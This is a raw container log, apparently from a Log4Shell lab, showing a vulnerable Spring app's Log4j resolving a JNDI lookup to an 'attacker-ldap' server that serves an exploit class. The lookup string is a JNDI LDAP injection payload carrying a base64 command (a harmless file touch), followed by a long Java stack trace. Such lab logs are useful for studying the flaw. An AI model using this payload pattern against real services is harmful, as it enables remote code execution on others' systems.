attacker-ldap_1    | [+] New HTTP Request From /172.21.0.3:60502  /Exploitt9L2pa0wmf.class
victim_1           | 2021-12-22 10:02:24,802 http-nio-8080-exec-3 WARN Error looking up JNDI resource [ldap://attacker-ldap:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg==]. javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: Exploitt9L2pa0wmf cannot be cast to javax.naming.spi.ObjectFactory]; remaining name '"Basic/Command/Base64/dG91Y2ggL3RtcC9pd29ya2VkCg=="'
attacker-ldap_1    | [+] Receive ClassRequest: Exploitt9L2pa0wmf.class
victim_1           |    at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)
attacker-ldap_1    | [+] Response Code: 200
victim_1           |    at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
victim_1           |    at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
victim_1           |    at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
victim_1           |    at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
victim_1           |    at javax.naming.InitialContext.lookup(InitialContext.java:417)
victim_1           |    at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
victim_1           |    at org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)
victim_1           |    at org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:221)
victim_1           |    at org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1110)
victim_1           |    at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1033)
victim_1           |    at org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)
victim_1           |    at org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)
victim_1           |    at org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)
victim_1           |    at org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)
victim_1           |    at org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:344)
victim_1           |    at org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)
victim_1           |    at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)
victim_1           |    at org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)
victim_1           |    at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)
victim_1           |    at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)
victim_1           |    at org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)
victim_1           |    at org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)
victim_1           |    at org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)
victim_1           |    at org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)
victim_1           |    at org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)
victim_1           |    at org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:540)
victim_1           |    at org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:498)
victim_1           |    at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:481)
victim_1           |    at org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:456)
victim_1           |    at org.apache.logging.log4j.core.config.AwaitCompletionReliabilityStrategy.log(AwaitCompletionReliabilityStrategy.java:82)
victim_1           |    at org.apache.logging.log4j.core.Logger.log(Logger.java:161)
victim_1           |    at org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2205)
victim_1           |    at org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2159)
victim_1           |    at org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2142)
victim_1           |    at org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2017)
victim_1           |    at org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)
victim_1           |    at org.apache.logging.log4j.spi.AbstractLogger.info(AbstractLogger.java:1320)
victim_1           |    at fr.christophetd.log4shell.vulnerableapp.MainController.index(MainController.java:18)
victim_1           |    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
victim_1           |    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
victim_1           |    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
victim_1           |    at java.lang.reflect.Method.invoke(Method.java:498)
victim_1           |    at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
victim_1           |    at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:150)
victim_1           |    at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:117)
victim_1           |    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:895)
victim_1           |    at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808)
victim_1           |    at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)
victim_1           |    at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1067)
victim_1           |    at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:963)
victim_1           |    at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006)
victim_1           |    at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:898)
victim_1           |    at javax.servlet.http.HttpServlet.service(HttpServlet.java:655)
victim_1           |    at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883)
victim_1           |    at javax.servlet.http.HttpServlet.service(HttpServlet.java:764)
victim_1           |    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:227)
